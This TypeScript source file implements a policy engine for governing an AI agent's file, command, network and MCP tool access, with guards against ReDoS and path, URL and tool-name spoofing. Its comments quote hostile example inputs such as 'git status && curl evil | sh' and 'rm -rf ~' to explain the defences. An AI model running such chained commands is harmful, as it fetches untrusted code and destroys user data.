import { z } from "zod";
import { expandPathCandidates, matchesGlob } from "../risk/sensitive.js";

/**
 * Policy engine for AI agent governance.
 * Inspired by Tool Factory's starky-approval-policy.yml pattern.
 *
 * Policies define what an AI agent can and cannot do:
 * - File access rules (allow/deny by glob pattern)
 * - Command rules (allow/deny by prefix)
 * - Network rules (allow/deny by domain)
 * - Risk threshold (auto-deny above a level)
 * - MCP tool rules
 */

export const PolicyRuleSchema = z.object({
	action: z.enum(["allow", "deny"]),
	reason: z.string().optional(),
});

export const FileRuleSchema = PolicyRuleSchema.extend({
	pattern: z.string(),
});

export const CommandRuleSchema = PolicyRuleSchema.extend({
	prefix: z.string().optional(),
	exact: z.string().optional(),
	regex: z.string().optional(),
});

export const NetworkRuleSchema = PolicyRuleSchema.extend({
	domain: z.string().optional(),
	url_prefix: z.string().optional(),
});

export const McpRuleSchema = PolicyRuleSchema.extend({
	server: z.string().optional(),
	tool: z.string().optional(),
});

export const PolicySchema = z.object({
	name: z.string(),
	version: z.string().default("1"),
	description: z.string().optional(),

	/** Maximum risk level to auto-allow. Above this, deny. */
	max_risk: z.enum(["none", "low", "medium", "high", "critical"]).default("high"),

	/** File access rules — evaluated in order, first match wins */
	files: z.object({
		deny: z.array(FileRuleSchema).default([]),
		allow: z.array(FileRuleSchema).default([]),
		default_action: z.enum(["allow", "deny"]).default("allow"),
	}).default({}),

	/** Command execution rules — evaluated in order, first match wins */
	commands: z.object({
		deny: z.array(CommandRuleSchema).default([]),
		allow: z.array(CommandRuleSchema).default([]),
		default_action: z.enum(["allow", "deny"]).default("allow"),
	}).default({}),

	/** Network access rules */
	network: z.object({
		deny: z.array(NetworkRuleSchema).default([]),
		allow: z.array(NetworkRuleSchema).default([]),
		default_action: z.enum(["allow", "deny"]).default("allow"),
	}).default({}),

	/** MCP tool rules */
	mcp: z.object({
		deny: z.array(McpRuleSchema).default([]),
		allow: z.array(McpRuleSchema).default([]),
		default_action: z.enum(["allow", "deny"]).default("allow"),
	}).default({}),

	/**
	 * Picomatch globs for in-repo paths whose Read does NOT raise
	 * `prompt` taint (v0.6.11 commit 9, `patchwork trust-repo-config`).
	 * Without entries here, every Read of an in-repo path is treated
	 * as untrusted by the taint engine — which is safe but noisy. The
	 * user marks specific subtrees as trusted to silence over-raise.
	 *
	 * `FORCE_UNTRUSTED_PATTERNS` from the taint engine ALWAYS wins —
	 * README/CHANGELOG/docs/examples/node_modules/vendor/dist/build
	 * cannot be marked trusted, because those are the canonical
	 * vectors for hostile prose to arrive.
	 */
	trusted_paths: z.array(z.string()).default([]),
});

export type Policy = z.infer<typeof PolicySchema>;
export type PolicyDecision = {
	allowed: boolean;
	reason: string;
	matched_rule?: string;
};

const RISK_ORDER = ["none", "low", "medium", "high", "critical"];

// ---------------------------------------------------------------------------
// Regex safety guard — prevents ReDoS from user-supplied policy patterns
// ---------------------------------------------------------------------------

const MAX_POLICY_REGEX_LENGTH = 256;

/** Backreferences: \1, \2, ... \9 */
const BACKREFERENCE_RE = /\\[1-9]/;

/** Lookbehind constructs: (?<=...) and (?<!...) */
const LOOKBEHIND_RE = /\(\?<[!=]/;

/**
 * Check whether a policy regex pattern is safe to evaluate.
 * Rejects patterns that could cause catastrophic backtracking (ReDoS):
 * - Overlong patterns (> 256 chars)
 * - Nested quantifiers (e.g. (a+)+, ([a-z]*)*)
 * - Backreferences (\1, \2, ...)
 * - Lookbehind constructs ((?<=...), (?<!...))
 * - Syntactically invalid regex
 */
export function isSafePolicyRegex(pattern: string): boolean {
	if (pattern.length > MAX_POLICY_REGEX_LENGTH) return false;
	if (BACKREFERENCE_RE.test(pattern)) return false;
	if (LOOKBEHIND_RE.test(pattern)) return false;
	if (hasNestedQuantifiers(pattern)) return false;

	// Final check: must be syntactically valid
	try {
		new RegExp(pattern);
	} catch {
		return false;
	}

	return true;
}

/**
 * Detect nested quantifiers that risk catastrophic backtracking.
 * Finds quantified groups whose body contains a quantifier:
 * (a+)+, ([a-z]*)+, ((x+))*, etc.
 */
function hasNestedQuantifiers(pattern: string): boolean {
	const n = pattern.length;

	for (let i = 0; i < n; i++) {
		const ch = pattern[i];

		// Skip escaped characters
		if (ch === "\\") { i++; continue; }

		// Skip character classes entirely
		if (ch === "[") {
			i++;
			while (i < n && pattern[i] !== "]") {
				if (pattern[i] === "\\") i++;
				i++;
			}
			continue;
		}

		if (ch === "(") {
			// Scan forward from this open-paren, tracking depth
			let depth = 1;
			let innerQuantifier = false;
			let j = i + 1;

			while (j < n && depth > 0) {
				const c = pattern[j];
				if (c === "\\") { j += 2; continue; }
				if (c === "[") {
					j++;
					while (j < n && pattern[j] !== "]") {
						if (pattern[j] === "\\") j++;
						j++;
					}
					j++;
					continue;
				}
				if (c === "(") depth++;
				else if (c === ")") {
					depth--;
					if (depth === 0) break;
				} else if (c === "+" || c === "*") {
					innerQuantifier = true;
				}
				j++;
			}

			// j is at the closing ')' — check if followed by a quantifier
			if (depth === 0 && innerQuantifier) {
				const next = j + 1 < n ? pattern[j + 1] : "";
				if (next === "+" || next === "*" || next === "?" || next === "{") {
					return true;
				}
			}
		}
	}

	return false;
}

export interface PolicyEvalInput {
	action: string;
	risk_level: string;
	target?: {
		type: string;
		path?: string;
		abs_path?: string;
		command?: string;
		url?: string;
		tool_name?: string;
	};
	/**
	 * Optional working directory for resolving relative paths during file
	 * policy evaluation. When provided, the engine evaluates the deny rules
	 * against the lexically-resolved absolute path AND the realpath
	 * (symlink-resolved) — closing the symlink-bypass and `..` bypass.
	 */
	cwd?: string;
}

/**
 * Evaluate a policy against an incoming tool use request.
 * Returns whether the action should be allowed or denied.
 */
export function evaluatePolicy(policy: Policy, input: PolicyEvalInput): PolicyDecision {
	// 1. Check risk threshold
	const riskIdx = RISK_ORDER.indexOf(input.risk_level);
	const maxRiskIdx = RISK_ORDER.indexOf(policy.max_risk);
	if (riskIdx > maxRiskIdx) {
		return {
			allowed: false,
			reason: `Risk level "${input.risk_level}" exceeds policy max "${policy.max_risk}"`,
			matched_rule: `max_risk:${policy.max_risk}`,
		};
	}

	// 2. Check file rules
	// Evaluate BOTH `path` and `abs_path` (so an adapter that supplies a
	// benign `path` and a sensitive `abs_path` can't bypass deny rules), and
	// expand each through pathCandidates() to also cover symlink targets and
	// `..`-collapsed forms.
	if (isFileAction(input.action)) {
		const rawPaths = [input.target?.path, input.target?.abs_path]
			.filter((p): p is string => typeof p === "string" && p.length > 0);
		if (rawPaths.length > 0) {
			const seen = new Set<string>();
			for (const raw of rawPaths) {
				for (const candidate of expandPathCandidates(raw, input.cwd)) {
					if (seen.has(candidate)) continue;
					seen.add(candidate);
					const decision = evaluateFileRules(policy.files, candidate);
					// Deny on first deny match across any candidate
					if (decision && !decision.allowed) return decision;
				}
			}
			// If no deny matched, evaluate allow/default against the
			// primary path candidate (preserve original semantics).
			const primary = rawPaths[0];
			if (primary !== undefined) {
				const decision = evaluateFileRules(policy.files, primary);
				if (decision) return decision;
			}
		}
	}

	// 3. Check command rules — guard against the original `path || abs_path`
	// short-circuit being repurposed; we already handled file paths above.
	if (input.target?.command && isCommandAction(input.action)) {
		const decision = evaluateCommandRules(policy.commands, input.target.command);
		if (decision) return decision;
	}

	// 4. Check network rules
	if (input.target?.url && isNetworkAction(input.action)) {
		const decision = evaluateNetworkRules(policy.network, input.target.url);
		if (decision) return decision;
	}

	// 5. Check MCP rules
	if (input.target?.tool_name && isMcpAction(input.action)) {
		const decision = evaluateMcpRules(policy.mcp, input.target.tool_name);
		if (decision) return decision;
	}

	return { allowed: true, reason: "No policy rule matched" };
}

function isFileAction(action: string): boolean {
	return action.startsWith("file_");
}

function isCommandAction(action: string): boolean {
	return action.startsWith("command_");
}

function isNetworkAction(action: string): boolean {
	return ["web_fetch", "web_search", "api_call"].includes(action);
}

function isMcpAction(action: string): boolean {
	return action.startsWith("mcp_");
}

function evaluateFileRules(
	rules: Policy["files"],
	filePath: string,
): PolicyDecision | null {
	// Deny rules checked first
	for (const rule of rules.deny) {
		if (matchesGlob(filePath, rule.pattern)) {
			return {
				allowed: false,
				reason: rule.reason || `File "${filePath}" matches deny pattern "${rule.pattern}"`,
				matched_rule: `files.deny:${rule.pattern}`,
			};
		}
	}

	// Then allow rules
	for (const rule of rules.allow) {
		if (matchesGlob(filePath, rule.pattern)) {
			return {
				allowed: true,
				reason: rule.reason || `File "${filePath}" matches allow pattern "${rule.pattern}"`,
				matched_rule: `files.allow:${rule.pattern}`,
			};
		}
	}

	// Default
	if (rules.default_action === "deny") {
		return {
			allowed: false,
			reason: `File "${filePath}" not in allow list (default: deny)`,
			matched_rule: "files.default:deny",
		};
	}

	return null;
}

function evaluateCommandRules(
	rules: Policy["commands"],
	command: string,
): PolicyDecision | null {
	const cmd = command.trim();

	// Deny rules first
	for (const rule of rules.deny) {
		if (matchesCommandRule(cmd, rule)) {
			return {
				allowed: false,
				reason: rule.reason || `Command denied by policy`,
				matched_rule: `commands.deny:${rule.prefix || rule.exact || rule.regex}`,
			};
		}
	}

	// Allow rules
	for (const rule of rules.allow) {
		if (matchesCommandRule(cmd, rule)) {
			return {
				allowed: true,
				reason: rule.reason || `Command allowed by policy`,
				matched_rule: `commands.allow:${rule.prefix || rule.exact || rule.regex}`,
			};
		}
	}

	// Default
	if (rules.default_action === "deny") {
		return {
			allowed: false,
			reason: `Command not in allow list (default: deny)`,
			matched_rule: "commands.default:deny",
		};
	}

	return null;
}

/**
 * Shell-metacharacter detection for command-allow rules. A `prefix: "git status"`
 * allow rule must NOT auto-allow `git status && curl evil | sh` — the trailing
 * compound is unrelated to the prefix the rule promised. We refuse the prefix
 * match if the command contains any unquoted shell metacharacter past the
 * matched prefix.
 *
 * This is intentionally strict: we reject ANY `;`, `&`, `|`, `<`, `>`, `$`,
 * backtick, or subshell `(...)`. If a user genuinely needs compound commands,
 * they should use an `exact:` or carefully-bounded `regex:` rule instead.
 */
function hasShellMetacharsAfter(command: string, prefixLen: number): boolean {
	const tail = command.slice(prefixLen);
	// eslint-disable-next-line no-useless-escape
	return /[;&|<>$`(){}]|\\\n/.test(tail);
}

function matchesCommandRule(
	command: string,
	rule: z.infer<typeof CommandRuleSchema>,
): boolean {
	if (rule.prefix) {
		const ruleLc = rule.prefix.toLowerCase();
		const cmdLc = command.toLowerCase();
		if (cmdLc.startsWith(ruleLc)) {
			// Reject if the rest of the command contains shell metacharacters —
			// otherwise allowlisting "git status" would let through
			// `git status && rm -rf ~`. Rules that need compound commands should
			// be expressed with `exact:` or a strict `regex:`.
			if (rule.action === "allow" && hasShellMetacharsAfter(command, rule.prefix.length)) {
				return false;
			}
			return true;
		}
	}
	if (rule.exact && command.trim() === rule.exact) {
		return true;
	}
	if (rule.regex) {
		if (!isSafePolicyRegex(rule.regex)) return false;
		try {
			return new RegExp(rule.regex).test(command);
		} catch {
			return false;
		}
	}
	return false;
}

function evaluateNetworkRules(
	rules: Policy["network"],
	url: string,
): PolicyDecision | null {
	// Deny rules first
	for (const rule of rules.deny) {
		if (matchesNetworkRule(url, rule)) {
			return {
				allowed: false,
				reason: rule.reason || `Network access denied by policy`,
				matched_rule: `network.deny:${rule.domain || rule.url_prefix}`,
			};
		}
	}

	// Allow rules
	for (const rule of rules.allow) {
		if (matchesNetworkRule(url, rule)) {
			return {
				allowed: true,
				reason: rule.reason || `Network access allowed by policy`,
				matched_rule: `network.allow:${rule.domain || rule.url_prefix}`,
			};
		}
	}

	// Default
	if (rules.default_action === "deny") {
		return {
			allowed: false,
			reason: `Network access not in allow list (default: deny)`,
			matched_rule: "network.default:deny",
		};
	}

	return null;
}

function matchesNetworkRule(
	url: string,
	rule: z.infer<typeof NetworkRuleSchema>,
): boolean {
	if (rule.domain) {
		try {
			const hostname = new URL(url).hostname;
			return hostname === rule.domain || hostname.endsWith(`.${rule.domain}`);
		} catch {
			return false;
		}
	}
	if (rule.url_prefix) {
		// Raw prefix matching is unsafe: `https://api.github.com` allows
		// `https://api.github.com.evil.tld/...`. Parse both URLs and require
		// scheme + hostname to match exactly, then check the path is a prefix
		// up to a path boundary (`/` or end-of-string).
		try {
			const target = new URL(url);
			const allowed = new URL(rule.url_prefix);
			if (target.protocol !== allowed.protocol) return false;
			if (target.hostname !== allowed.hostname) return false;
			if (target.port !== allowed.port) return false;
			const wantPath = allowed.pathname;
			const gotPath = target.pathname;
			if (!gotPath.startsWith(wantPath)) return false;
			// Path boundary: the prefix must end at the URL or at a `/` —
			// `https://x/api` must NOT match `https://x/api-evil/...`.
			if (gotPath.length > wantPath.length && !wantPath.endsWith("/")) {
				return gotPath[wantPath.length] === "/";
			}
			return true;
		} catch {
			return false;
		}
	}
	return false;
}

function evaluateMcpRules(
	rules: Policy["mcp"],
	toolName: string,
): PolicyDecision | null {
	// Deny rules first
	for (const rule of rules.deny) {
		if (matchesMcpRule(toolName, rule)) {
			return {
				allowed: false,
				reason: rule.reason || `MCP tool denied by policy`,
				matched_rule: `mcp.deny:${rule.server || rule.tool}`,
			};
		}
	}

	// Allow rules
	for (const rule of rules.allow) {
		if (matchesMcpRule(toolName, rule)) {
			return {
				allowed: true,
				reason: rule.reason || `MCP tool allowed by policy`,
				matched_rule: `mcp.allow:${rule.server || rule.tool}`,
			};
		}
	}

	// Default
	if (rules.default_action === "deny") {
		return {
			allowed: false,
			reason: `MCP tool not in allow list (default: deny)`,
			matched_rule: "mcp.default:deny",
		};
	}

	return null;
}

/**
 * Parse an MCP tool name into its (server, tool) parts.
 * Format: `mcp__<server>__<tool>`. Returns null if the name does not match.
 *
 * Strict regex parse — substring matching `__github__` would let
 * `mcp__evil__github__delete_everything` inherit GitHub's allow rules.
 */
function parseMcpToolName(toolName: string): { server: string; tool: string } | null {
	// `mcp__` prefix, then a server name with no `__` inside, then `__`, then the tool.
	const m = /^mcp__([^_][^]*?)__([^]+)$/.exec(toolName);
	if (!m) return null;
	const server = m[1];
	const tool = m[2];
	if (!server || !tool) return null;
	if (server.includes("__")) return null;
	return { server, tool };
}

function matchesMcpRule(
	toolName: string,
	rule: z.infer<typeof McpRuleSchema>,
): boolean {
	if (rule.tool && toolName === rule.tool) {
		return true;
	}
	if (rule.server) {
		const parsed = parseMcpToolName(toolName);
		if (!parsed) return false;
		return parsed.server === rule.server;
	}
	return false;
}
